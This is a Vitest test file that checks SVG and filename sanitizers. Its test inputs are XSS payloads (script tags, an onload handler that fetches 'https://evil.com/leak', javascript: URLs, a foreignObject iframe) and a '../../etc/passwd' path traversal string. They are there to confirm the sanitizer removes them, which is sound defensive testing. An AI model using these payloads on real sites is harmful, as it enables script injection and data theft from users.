import { describe, it, expect } from 'vitest'
import { sanitizeSvg } from '../../lib/sanitizer/svgSanitizer'
import { sanitizeFilename, slugify } from '../../lib/sanitizer/filenameSanitizer'

describe('Security Sanitizers', () => {
  describe('SVG XSS Sanitizer', () => {
    it('strips <script> tags and embedded executable scripts', () => {
      const malicious = `<svg viewBox="0 0 24 24"><script>alert("XSS")</script><circle cx="12" cy="12" r="10"/></svg>`
      const sanitized = sanitizeSvg(malicious)
      expect(sanitized).not.toContain('<script')
      expect(sanitized).not.toContain('alert')
      expect(sanitized).toContain('<circle')
    })

    it('strips inline on* event handler attributes', () => {
      const malicious = `<svg onload="fetch('https://evil.com/leak')" onclick="alert(1)"><rect width="10" height="10"/></svg>`
      const sanitized = sanitizeSvg(malicious)
      expect(sanitized).not.toContain('onload')
      expect(sanitized).not.toContain('onclick')
      expect(sanitized).toContain('<rect')
    })

    it('strips javascript: pseudoprotocol URLs in href', () => {
      const malicious = `<svg><a href="javascript:alert('pwned')"><text>Click</text></a></svg>`
      const sanitized = sanitizeSvg(malicious)
      expect(sanitized).not.toContain('javascript:')
    })

    it('removes <foreignObject> tags which can embed HTML elements', () => {
      const malicious = `<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><iframe src="evil.html"/></body></foreignObject></svg>`
      const sanitized = sanitizeSvg(malicious)
      expect(sanitized).not.toContain('<foreignObject')
      expect(sanitized).not.toContain('<iframe')
    })

    it('throws error on non-SVG payload', () => {
      expect(() => sanitizeSvg('Not an SVG payload')).toThrow('Root <svg> element required')
    })
  })

  describe('Filename Sanitizer & Slugify', () => {
    it('neutralizes directory traversal patterns', () => {
      const malicious = '../../etc/passwd.svg'
      const clean = sanitizeFilename(malicious)
      expect(clean).not.toContain('..')
      expect(clean).not.toContain('/')
      expect(clean).toBe('etc_passwd.svg')
    })

    it('generates URL-safe slugs', () => {
      expect(slugify('Modern Cloud Security & Icons!')).toBe('modern-cloud-security-icons')
      expect(slugify('   Spaces   Around   ')).toBe('spaces-around')
    })
  })
})
